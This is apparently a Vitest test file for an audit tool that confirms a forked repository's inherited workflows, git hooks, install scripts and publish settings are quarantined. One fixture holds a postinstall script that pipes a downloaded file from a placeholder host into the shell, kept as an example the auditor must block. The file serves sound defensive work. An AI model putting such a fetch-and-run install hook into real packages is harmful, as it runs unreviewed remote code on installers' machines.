/**
 * AFM-005 — Quarantine inherited publication, hooks and deployment.
 *
 * Acceptance:
 *   - No token or service account from upstream configuration is assumed
 *     available or reused.
 *   - Push/tag events cannot publish packages or deploy infrastructure without
 *     a later approved release configuration.
 *   - Local installation does not trigger unreviewed repository or agent
 *     automation.
 */

import { describe, expect, it, beforeAll, afterAll } from "vitest";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

import { auditAutomation, effectiveHooksPath } from "../../tools/import/audit-automation.ts";

let tmp: string;
beforeAll(() => {
  tmp = mkdtempSync(join(tmpdir(), "afm005-"));
});
afterAll(() => {
  rmSync(tmp, { recursive: true, force: true });
});

describe("AFM-005: this repository has no live automation", () => {
  const audit = () => auditAutomation(resolve("."));

  it("reports nothing blocked", () => {
    const result = audit();
    const blocked = result.findings.filter((f) => f.severity === "blocked");
    expect(blocked).toEqual([]);
    expect(result.quarantined).toBe(true);
  }, 120_000);

  it("has no workflow that could run on push or tag", () => {
    const dir = resolve(".github/workflows");
    const files = existsSync(dir) ? readdirSync(dir) : [];
    expect(files).toEqual([]);
  });

  it("has no installed git hook", () => {
    const dir = resolve(".git/hooks");
    const hooks = existsSync(dir) ? readdirSync(dir).filter((n) => !n.endsWith(".sample")) : [];
    expect(hooks).toEqual([]);
  });

  it("redirects core.hooksPath away from .git/hooks", () => {
    // This is what keeps a dependency-installed hook inert. Without it, the
    // lefthook postinstall re-arms pre-commit on every fresh install.
    expect(effectiveHooksPath(resolve("."))).toBe(".githooks");
  });

  it("carries no inherited install-time lifecycle script", () => {
    const root = JSON.parse(readFileSync("package.json", "utf8"));
    for (const key of ["preinstall", "install", "postinstall", "prepare"]) {
      expect(root.scripts[key]).toBeUndefined();
    }
  });

  it("assumes no upstream credential", () => {
    // No .npmrc means no auth for the @hyperframes scope, so no publish can
    // succeed even if a publish command were run by hand.
    expect(existsSync(resolve(".npmrc"))).toBe(false);
  });

  it("documents every retained review item", () => {
    const doc = readFileSync("docs/upstream/disabled-automation.md", "utf8");
    const reviews = audit().findings.filter((f) => f.severity === "review");
    // Each distinct review code must be explained rather than left implicit.
    for (const code of new Set(reviews.map((f) => f.code))) {
      expect(doc.length).toBeGreaterThan(0);
      expect(
        code === "publish-config"
          ? doc.includes("publishConfig")
          : code === "auto-update"
            ? doc.includes("renovate")
            : doc.includes("lefthook"),
      ).toBe(true);
    }
  }, 120_000);
});

describe("AFM-005: the audit actually detects live automation", () => {
  /** Builds a fixture repository with the given files. */
  function fixture(name: string, files: Record<string, string>): string {
    const root = join(tmp, name);
    for (const [rel, content] of Object.entries(files)) {
      const full = join(root, rel);
      mkdirSync(join(full, ".."), { recursive: true });
      writeFileSync(full, content);
    }
    return root;
  }

  it("blocks on a live workflow", () => {
    const root = fixture("workflow", {
      ".github/workflows/publish.yml": "on:\n  push:\n    tags: ['v*']\n",
      "package.json": "{}",
    });
    const result = auditAutomation(root);
    expect(result.quarantined).toBe(false);
    expect(
      result.findings.some((f) => f.code === "live-workflow" && f.severity === "blocked"),
    ).toBe(true);
  });

  it("blocks on an install-time lifecycle script", () => {
    const root = fixture("lifecycle", {
      "package.json": JSON.stringify({ scripts: { postinstall: "curl https://example.com | sh" } }),
    });
    const result = auditAutomation(root);
    expect(result.quarantined).toBe(false);
    expect(result.findings.some((f) => f.code === "lifecycle-script")).toBe(true);
  });

  it("does not flag a provably inert lifecycle script", () => {
    // Upstream uses `echo skip` deliberately in five packages; flagging it
    // would make the audit permanently noisy and train people to ignore it.
    const root = fixture("inert", {
      "package.json": JSON.stringify({ scripts: { prepublishOnly: "echo skip" } }),
    });
    expect(auditAutomation(root).findings.filter((f) => f.code === "lifecycle-script")).toEqual([]);
  });

  it("reports an installed git hook", () => {
    const root = fixture("hooks", {
      ".git/hooks/pre-commit": "#!/bin/sh\nlefthook run pre-commit\n",
      "package.json": "{}",
    });
    expect(auditAutomation(root).findings.some((f) => f.code === "installed-git-hook")).toBe(true);
  });

  it("ignores quarantined upstream material under docs/upstream", () => {
    // Quarantined workflow text is expected to exist; flagging it would keep
    // the audit permanently red for material that cannot run.
    const root = fixture("quarantined", {
      "docs/upstream/hyperframes/workflows/ci.yml": "on: push\n",
      "docs/upstream/hyperframes/package.json": JSON.stringify({
        scripts: { postinstall: "dangerous" },
      }),
      "package.json": "{}",
    });
    const result = auditAutomation(root);
    expect(result.quarantined).toBe(true);
    expect(result.findings).toEqual([]);
  });

  it("flags public publish access on a non-private package", () => {
    const root = fixture("publish", {
      "package.json": JSON.stringify({
        name: "@someone-else/thing",
        publishConfig: { access: "public" },
      }),
    });
    expect(auditAutomation(root).findings.some((f) => f.code === "publish-config")).toBe(true);
  });
});
